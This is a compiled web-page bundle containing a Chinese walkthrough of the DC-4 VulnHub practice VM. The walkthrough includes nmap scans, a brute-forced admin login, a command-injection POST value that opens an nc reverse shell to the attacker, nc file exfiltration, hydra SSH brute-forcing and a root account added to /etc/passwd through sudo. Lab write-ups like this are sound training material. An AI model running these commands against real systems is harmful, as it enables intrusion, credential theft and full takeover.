(window.webpackJsonp=window.webpackJsonp||[]).push([[49],{803:function(s,a,n){"use strict";n.r(a);var e=n(1),t=Object(e.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h2",{attrs:{id:"_0x01-部署"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-部署"}},[s._v("#")]),s._v(" 0x01 部署")]),s._v(" "),n("p",[s._v("靶机地址：")]),s._v(" "),n("blockquote",[n("p",[n("a",{attrs:{href:"https://www.vulnhub.com/entry/dc-4,313/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.vulnhub.com/entry/dc-4,313/"),n("OutboundLink")],1)])]),s._v(" "),n("p",[n("strong",[s._v("DESCRIPTION")])]),s._v(" "),n("p",[s._v("DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.")]),s._v(" "),n("p",[s._v("Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.")]),s._v(" "),n("p",[s._v("Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.")]),s._v(" "),n("p",[s._v("For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.")]),s._v(" "),n("p",[s._v("只有一个flag")]),s._v(" "),n("h2",{attrs:{id:"_0x02-信息收集"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-信息收集"}},[s._v("#")]),s._v(" 0x02 信息收集")]),s._v(" "),n("p",[s._v("靶机使用vmware部署，NAT模式")]),s._v(" "),n("p",[s._v("nmap扫描网段")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("nmap -sP 192.168.190.0/24\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926153642099.png",alt:"image-20210926153642099"}})]),s._v(" "),n("p",[s._v("发现靶机IP：192.168.190.139，继续扫描")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("nmap -T5 -A -v -p- 192.168.190.139\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("结果：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-26 14:27 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating ARP Ping Scan at 14:27\nScanning 192.168.190.139 [1 port]\nCompleted ARP Ping Scan at 14:27, 0.04s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 14:27\nCompleted Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed\nInitiating SYN Stealth Scan at 14:27\nScanning 192.168.190.139 [65535 ports]\nDiscovered open port 80/tcp on 192.168.190.139\nDiscovered open port 22/tcp on 192.168.190.139\nCompleted SYN Stealth Scan at 14:27, 1.00s elapsed (65535 total ports)\nInitiating Service scan at 14:27\nScanning 2 services on 192.168.190.139\nCompleted Service scan at 14:27, 6.02s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 192.168.190.139\nNSE: Script scanning 192.168.190.139.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.11s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nNmap scan report for 192.168.190.139\nHost is up (0.00045s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)\n|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)\n|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)\n80/tcp open  http    nginx 1.15.10\n| http-methods: \n|_  Supported Methods: GET HEAD POST\n|_http-server-header: nginx/1.15.10\n|_http-title: System Tools\nMAC Address: 00:0C:29:B3:F5:3B (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 198.838 days (since Thu Mar 11 18:21:01 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=256 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.45 ms 192.168.190.139\n\nNSE: Script Post-scanning.\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nInitiating NSE at 14:27\nCompleted NSE at 14:27, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.81 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br")])]),n("p",[s._v("发现80端口，登陆后只有一个登录界面，未发现其他公开的CMS或组件")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926153952656.png",alt:"image-20210926153952656"}})]),s._v(" "),n("h2",{attrs:{id:"_0x03-渗透"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-渗透"}},[s._v("#")]),s._v(" 0x03 渗透")]),s._v(" "),n("p",[s._v("尝试使用burpsuite进行web爆破，根据系统名包含admin，指定用户名admin，先爆破密码")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926154453036.png",alt:"image-20210926154453036"}})]),s._v(" "),n("p",[s._v("爆破发现admin密码happy")]),s._v(" "),n("p",[s._v("使用admin登录后，发现web提供了执行命令的功能，需要执行的命令通过post参数传递")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926154602455.png",alt:"image-20210926154602455"}})]),s._v(" "),n("p",[s._v("使用nc回弹shell，kali执行")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("nc -lvp 4444 \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("使用hackbar发送post参数"),n("code",[s._v("radio=nc 192.168.190.129 4444 -e /bin/bash&submit=Run")]),s._v("，获得反弹shell")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926154739554.png",alt:"image-20210926154739554"}})]),s._v(" "),n("p",[s._v("执行命令获取方便观察的shell")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("python -c 'import pty; pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("h2",{attrs:{id:"_0x04-提权"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-提权"}},[s._v("#")]),s._v(" 0x04 提权")]),s._v(" "),n("p",[s._v("查看/etc/passwd，发现几个用户，去home下查看，只有jim下存在文件，backups下有一个old-passwds.bak文件，mbox文件无权限，test.sh没什么用处")]),s._v(" "),n("p",[s._v("使用nc获取old-passwds.bak文件")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("nc -nvlp 5555 > old-passwords.bak\nnc 192.168.141.134 5555 < /home/jim/backups/old-passwords.bak\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v("然后使用old-passwords.bak文件对jim进行爆破")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("hydra -l jim -P old-passwords.bak -vV 192.168.190.139 ssh\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("爆破成功得到密码：")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926160224587.png",alt:"image-20210926160224587"}})]),s._v(" "),n("p",[s._v("登录jim后发现mbox下内容：")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926160501768.png",alt:"image-20210926160501768"}})]),s._v(" "),n("p",[s._v("似乎是一个邮件，在/var/mail/jim中发现邮件内容：")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926160535935.png",alt:"image-20210926160535935"}})]),s._v(" "),n("p",[s._v("得到charles密码")]),s._v(" "),n("p",[s._v("登录charles，执行"),n("code",[s._v("sudo -l")]),s._v("发现charly可以执行teehee，可以将标准输入复制到我们选择的文件中")]),s._v(" "),n("p",[s._v("创建一个拥有root权限的账号")]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test::0:0:::/bin/sh"')]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" teehee -a /etc/passwd\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("test")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br")])]),n("p",[s._v("在/root/下找到flag")]),s._v(" "),n("p",[n("img",{attrs:{src:"/assets/img/image-20210926160832848.png",alt:"image-20210926160832848"}})])])}),[],!1,null,null,null);a.default=t.exports}}]);